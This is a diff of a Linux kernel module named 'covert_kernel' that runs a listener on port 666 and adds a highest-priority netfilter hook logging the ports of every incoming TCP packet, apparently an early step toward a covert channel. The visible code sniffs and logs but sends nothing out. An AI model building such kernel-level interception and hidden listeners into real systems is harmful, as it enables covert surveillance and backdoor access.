@@ -1,8 +1,12 @@
 #include <linux/init.h>
+#include <linux/ip.h>
 #include <linux/kernel.h>
 #include <linux/kthread.h>
 #include <linux/module.h>
+#include <linux/netfilter.h>
+#include <linux/netfilter_ipv4.h>
 #include <linux/slab.h>
+#include <linux/tcp.h>
 #include <net/sock.h>
 
 #define PORT 666
@@ -13,6 +17,8 @@ struct service {
 };
 
 struct service* svc;
+
+static struct nf_hook_ops nfho;
 
 int recv_msg(struct socket* sock, unsigned char* buf, int len) {
     struct msghdr msg;
@@ -79,9 +85,9 @@ int start_listen(void) {
     sin.sin_family = AF_INET;
     sin.sin_port = htons(PORT);
 
-    printk(KERN_ALERT "Finding null svc %p\n", (void *) svc);
-    printk(KERN_ALERT "Finding null socket %p\n", (void *) svc->listen_socket);
-    printk(KERN_ALERT "Finding null sin %p\n", (void *) &sin);
+    printk(KERN_ALERT "Finding null svc %p\n", (void*) svc);
+    printk(KERN_ALERT "Finding null socket %p\n", (void*) svc->listen_socket);
+    printk(KERN_ALERT "Finding null sin %p\n", (void*) &sin);
 
     error = kernel_bind(svc->listen_socket, (struct sockaddr*) &sin, sizeof(sin));
     if (error < 0) {
@@ -116,15 +122,36 @@ int start_listen(void) {
     return 0;
 }
 
+unsigned int hook_func(void* priv, struct sk_buff* skb, const struct nf_hook_state* state) {
+    struct iphdr* ip_header = (struct iphdr*) skb_network_header(skb);
+    struct tcphdr* tcp_header;
+    if (ip_header->protocol == 6) {
+        printk(KERN_INFO "TCP Packet\n");
+        printk(KERN_INFO "IP Header len %d\n", ip_header->ihl);
+        tcp_header = (struct tcphdr*) skb_transport_header(skb);
+        printk(KERN_INFO "Source Port: %u\n", ntohs(tcp_header->source));
+        printk(KERN_INFO "Destination Port: %u\n", ntohs(tcp_header->dest));
+    }
+    return NF_ACCEPT; //accept the packet
+}
+
 static int __init mod_init(void) {
     svc = kmalloc(sizeof(struct service), GFP_KERNEL);
     svc->thread = kthread_run((void*) start_listen, NULL, "packet_send");
     printk(KERN_ALERT "covert_kernel module loaded\n");
 
+    nfho.hook = hook_func;
+    nfho.hooknum = NF_INET_PRE_ROUTING;
+    nfho.pf = PF_INET;
+    //Set hook highest priority
+    nfho.priority = NF_IP_PRI_FIRST;
+    nf_register_net_hook(&init_net, &nfho);
     return 0;
 }
 
 static void __exit mod_exit(void) {
+    nf_unregister_net_hook(&init_net, &nfho);
+
     if (svc->listen_socket != NULL) {
         kernel_sock_shutdown(svc->listen_socket, SHUT_RDWR);
         sock_release(svc->listen_socket);
